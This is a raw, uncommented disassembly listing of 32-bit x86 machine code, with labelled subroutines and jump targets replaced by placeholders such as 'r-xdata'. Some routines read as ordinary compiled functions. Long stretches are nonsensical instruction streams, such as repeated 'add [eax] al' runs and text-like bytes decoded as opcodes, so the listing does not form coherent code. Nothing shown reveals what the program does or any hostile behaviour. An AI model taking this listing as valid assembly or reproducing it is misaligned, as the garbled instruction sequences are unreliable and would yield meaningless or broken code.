add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_410c80
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_410c6c
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410cc0
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_410cf8
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_410d34
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_405508
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_410da8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410dee
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410df5
retn
mov eax rw-data
call sub_403eb4
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404930
sub_410e00
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410e25
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410e2c
retn
sub_4113ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_411749
and eax 0x33004117
pop ss
inc ecx
add [ 0x1004117 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
dec ecx
pop ss
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x17c40040 ] cl
inc ecx
add [ ebp + 0x17 ] dl
inc ecx
add [ eax ] al
add [ eax ] al
add ah dl
pop ss
inc ecx
add [ eax ] al
sbb [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
out 0x17 al
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov [ esi ] dl
inc ecx
add [ eax ] ch
xor eax [ eax ]
rol [ ecx + 0x41 ] 0x1
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
add [ eax + 0x41 ] al
add [ eax ] dl
inc ecx
inc ecx
add [ eax ] bl
inc ecx
inc ecx
add [ eax + eax * 2 ] ch
inc ecx
add [ eax + 0x42 ] ah
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] dl
inc eax
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
mov [ esi ] dl
inc ecx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
mov esp 0x10004143
imul esi [ ebx + 0x74 ] 0x746e65
sbb [ ecx ] al
pop es
adc eax 0x746e4954
jb r-xdata
inc ecx
inc ecx
add [ eax ] bl
inc ecx
inc ecx
add [ eax + eax * 2 ] ch
inc ecx
add [ eax ] ch
inc esp
inc ecx
add [ eax ] cl
inc ebp
inc ecx
add [ eax + esi + 0x43bc0040 ] ch
inc ecx
add [ eax ] dl
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
add [ eax ] bh
inc ebp
inc ecx
add [ eax ] dh
inc ebp
inc ecx
add [ ebx + eax * 2 + 0x20041 ] al
sub [ ecx + eax * 2 ] al
or [ ebp + 0x41 ] al
imul esi [ ebx + 0x74 ] 0xc4746e65
pop ss
inc ecx
add ah bh
push ss
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x4118
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x59ffbee8 ] bl
sbb [ ecx ] al
or al 0x0
add [ eax ] al
sub_411a2c
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
hlt
outsb
dec ecx
je r-xdata
dec eax
inc ecx
add ah ch
inc edi
inc ecx
add al cl
push esi
inc ecx
add ah bh
push esi
inc ecx
add [ eax ] al
push edi
inc ecx
add [ edi + edx * 2 ] al
inc ecx
add al bl
dec ebx
inc ecx
add [ eax + 0x58 ] bh
inc ecx
add ah dl
pop eax
inc ecx
add [ eax - 0x67ffbea7 ] ch
push edx
inc ecx
add ah ah
pop ecx
inc ecx
add [ eax + 0x5a ] bl
inc ecx
add [ esp + edx * 2 + 0x41 ] bh
add [ eax + 0x34004154 ] cl
inc edi
inc ecx
add [ edx * 2 + 0x55640041 ] ah
inc ecx
add al dl
push ebp
inc ecx
add [ ebx + ecx * 2 + 0x57600041 ] al
inc ecx
add [ ebp + ecx * 2 + 0x4e600041 ] cl
inc ecx
add [ edi + edx * 2 + 0x57ac0041 ] bl
inc ecx
add ah al
dec esi
inc ecx
add [ eax ] bl
dec edi
inc ecx
add ah al
dec edi
inc ecx
add [ ecx + edx * 2 + 0x41 ] bl
add [ ecx + edx * 2 + 0x52480041 ] dh
inc ecx
add ah ch
push esp
inc ecx
add [ eax ] cl
push ebp
inc ecx
add [ eax ] al
pop eax
inc ecx
add [ eax + 0x56 ] dl
inc ecx
add [ eax ] dl
pop edx
inc ecx
add [ eax ] ah
pop edx
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
cwde
sbb al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
sbb eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ ebx ] bl
inc ecx
add [ eax ] dh
add [ eax ] al
add [ ecx + ebx ] bl
inc ecx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
and [ ecx + eax * 2 ] dl
adc [ ecx + 0x41 ] al
add ah dh
add [ eax + esi + 0x30e80040 ] ch
inc eax
add [ eax - 0xbffbea6 ] ch
imul ebp [ esi + 0x67 ] 0x7473694c
inc eax
sbb eax [ ecx ]
pop es
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
push ebx
je r-xdata
popad
pop edx
inc ecx
add [ ebx + ebx * 2 ] cl
inc ecx
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ebx + ebx * 2 + 0x5c300041 ] ch
inc ecx
add [ edi ] al
push esp
push ebx
je r-xdata
test al 0x5a
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add al 0x1a
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
cwde
sbb al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx + 0x80041 ] dh
add [ eax ] al
aam 0x1b
inc ecx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
shl [ eax + 0x41 ] 0x0
test al 0x5a
inc ecx
add ah ch
pop esi
inc ecx
add [ eax ] al
pop edi
inc ecx
add [ eax - 0x4fffbea2 ] ah
pop esi
inc ecx
add [ ebx + ebx * 2 + 0x5ec00041 ] ch
inc ecx
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
jb r-xdata
jae r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
insd
or al 0x1d
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
sbb eax 0x100041
add [ eax ] al
sbb eax [ fs : ecx ]
sub [ ebx ] dh
inc eax
add [ ebx + esi ] dh
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0xffffffffa8415d3d
pop edx
inc ecx
add ah dh
pop edx
inc ecx
add [ ebx + ebx * 2 ] cl
inc ecx
add ah bh
pushad
inc ecx
add [ ecx + ebp ] ch
inc eax
add [ ecx ] dh
inc ecx
add [ eax ] dh
pop esp
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
popad
xor [ ecx + eax * 2 ] bl
sub [ edx + 0x41 ] ah
add [ 0x6d654d54 ] cl
je r-xdata
inc ecx
add [ 0x6e614854 ] cl
insb
add al al
pop esi
insd
and [ ecx + eax * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx ] bh
inc ecx
add [ eax ] cl
add [ eax ] al
add [ ebx + ebx + 0x41 ] ah
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0xffffffffa8415c51
pop edx
inc ecx
add ah ch
pop esi
inc ecx
add [ eax ] al
pop edi
inc ecx
add [ eax - 0x4fffbea2 ] ah
pop esi
inc ecx
add [ ebx + ebx * 2 + 0x5ec00041 ] ch
popad
inc ecx
add ah dh
add [ ebp + 0x1bb00040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
sbb eax [ ecx ]
add al 0x0
add [ eax ] al
mov al [ 0x28004010 ]
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0xffffffffa8415be1
pop edx
jns r-xdata
push ebx
je r-xdata
push ebx
push ebx
outsd
jb r-xdata
inc ecx
add [ eax ] dh
pop esp
inc ecx
add [ eax ] ch
bound eax [ ecx ]
or eax 0x6d654d54
test al 0x5a
inc ecx
add ah dh
pop edx
inc ecx
add [ ebx + ebx * 2 ] cl
inc ecx
add ah bh
pushad
inc ecx
add [ eax + 0x64 ] dh
inc ecx
add [ ecx ] dh
inc ecx
add [ eax ] dh
pop esp
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
je r-xdata
insd
popad
insd
mov [ 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x1d
inc ecx
add [ eax + eax ] dl
add [ eax ] al
rcr [ ecx + eax * 2 ] 0x0
sub [ ebx ] dh
inc eax
add [ ebx + esi ] dh
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
pop eax
popad
inc ecx
add [ eax - 0x3ffbea6 ] ch
popad
inc ecx
add [ ebx + ebx * 2 ] cl
inc ecx
add ah bh
pushad
inc ecx
add [ edx + 0x61340041 ] dh
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
outsd
popad
insd
mov eax eax
add al 0x1e
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
push ds
inc ecx
add [ eax ] bl
add [ eax ] al
add al al
sbb al 0x41
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
cmp [ ecx + eax * 2 ] ah
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
sub_411f48
and bl [ edi ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx + 0x180041 ] bh
add [ eax ] al
xchg esp eax
adc [ eax ] eax
sub [ ebx ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les esp [ ecx ]
inc ecx
add [ eax + eax ] bh
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x700040 ] dl
add [ eax ] al
pop es
push esp
push edx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x280041 ] al
add [ eax ] al
mov al [ 0x28004010 ]
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
shl [ ecx + eax * 2 ] 0x1
clc
inc ecx
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ esi ] al
push esp
inc esi
imul ebp [ ebp + 0x72 ] 0x4120d890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
mov al [ 0x28004010 ]
xor eax [ eax ]
fcomp [ ecx + 0x33380041 ]
inc eax
add [ ebx + esi ] bh
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
jo r-xdata
add [ ebx + esi ] bh
inc ecx
add [ edx + ebx * 4 + 0x292c0041 ] cl
inc eax
add [ edi ] al
push esp
push esp
push 0x64616572
shl [ ecx ] 0x1
inc ecx
add [ edx ] cl
push cs
push esp
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc ah [ ecx ]
inc ecx
add [ eax + eax ] bh
add [ eax ] ch
and [ ecx ] al
sub [ ebx ] dh
inc eax
add [ ebx + esi ] dh
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x7416199
inc ebp
push esp
push 0x64616572
mov esp 0x4121
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
and [ ecx ] eax
cmp al 0x0
shr [ eax + 0x21 ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x21 ] ch
inc ecx
add [ eax + eax ] cl
add [ eax ] al
adc al 0x6d
inc eax
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax + 0x55 ] dh
inc eax
add [ ebp + edx * 2 + 0x40 ] bh
add [ ebx + esi ] bh
inc eax
add [ eax ] dh
xor eax [ eax ]
mov [ ebp + 0x40 ] ss
add [ eax + esi - 0x57e3ffc0 ] ch
inc ecx
add [ eax + ebp * 4 + 0x41 ] dl
add [ eax + ebp * 4 - 0x56dbffbf ] bh
inc ecx
add [ eax + 0xc0041a9 ] ch
stosb [ edi ]
inc ecx
add [ esp + ebp * 4 ] cl
inc ecx
add [ eax ] bl
lodsb [ esi ]
inc ecx
add [ esp + ebp * 4 ] ah
inc ecx
add [ eax ] dh
lodsb [ esi ]
inc ecx
add [ esp + ebp * 4 ] bh
inc ecx
add [ eax + 0xe0041ac ] bh
push esp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x1800411f
add [ eax ] al
add [ ecx + edx + 0x33280040 ] dl
sbb [ eax ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
and [ ecx ] al
or [ eax ] al
add [ eax ] al
mov al [ 0x28004010 ]
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
shr [ edi ] 0x1
inc ecx
add [ esp + edx * 2 ] cl
inc ebx
insb
popad
jae r-xdata
aam 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
and [ ecx ] eax
jl r-xdata
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add [ eax + 0x41 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
popad
insd
in al 0x21
inc ecx
add [ edi ] cl
cmovns eax [ ebp + 0x73 ]
imul esp [ edi + 0x6e ] 0x6f4e7265
je r-xdata
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
nop
imul eax [ ecx ] 0xfffffff8
inc ecx
add al dh
imul eax [ ecx ] 0x24
insb
inc ecx
add [ eax ] bh
outsd
inc ecx
add [ ebp * 2 - 0x71bfffbf ] dl
inc ecx
add [ ebp * 2 - 0x70efffbf ] dh
inc ecx
add al bh
mov es [ ecx ]
je r-xdata
add [ eax ] al
sub [ eax ] ah
inc ecx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
inc esp
and al 0x4
aam 0xe9
add [ bx + si ] 0x0
int3
jns r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop es
inc ebx
insb
popad
jae r-xdata
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e7db71
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
pop ebp
retn 0x4
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
dec [ ebx - 0x3f7c3340 ]
fsubr st1

add bh bh
sub_412598
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405d04
pop edi
pop esi
pop ebx
retn
sub_4125c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405ce8
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4125e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405d0c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412628
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
sub al 0x28
inc ecx
add [ ecx ] cl
push esp
push edx
inc edi
jb r-xdata
inc ecx
add [ eax + eax ] dl
add [ eax ] al
mov al [ 0x28004010 ]
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
mov [ esp + 0x4 ] edx
mov [ esp ] eax
jne r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
add al 0x89
add al 0x24
mov eax eax
enter 0x4126 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4126 0x0
and al 0x0
add [ eax ] al
mov al [ 0x28004010 ]
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
push esp
sub eax [ ecx ]
or dl [ edx + edx * 2 + 0x65 ]
inc edi
jb r-xdata
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
nop
jne r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4139f4
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_40330c
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_40330c
test al al
je r-xdata
in al dx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
jae r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4126e0
mov esi eax
jmp r-xdata
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4126e0
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_40330c
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4126e0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4139f4
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_40330c
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_40330c
test al al
je r-xdata
sub_412740
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4126e0
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4126e0
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
